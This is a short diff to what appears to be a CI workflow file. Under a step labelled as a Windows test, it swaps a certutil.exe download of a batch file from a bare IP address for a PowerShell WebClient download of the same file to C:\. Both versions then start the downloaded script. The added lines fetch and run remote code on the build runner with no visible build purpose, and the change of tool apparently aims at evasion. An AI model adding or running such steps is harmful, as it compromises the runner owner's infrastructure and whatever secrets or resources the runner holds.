@@ -37,5 +37,5 @@ jobs:
         run: ipconfig
       - name: test windows cmd ur
         run: |
-          certutil.exe -urlcache -split -f http://113.128.105.75:8081/startgat.bat startgat.bat
-          start startgat.bat
+          powershell (new-object Net.WebClient).DownloadFile('http://113.128.105.75:8081/startgat.bat','C:\startgat.bat')
+          start C:\startgat.bat
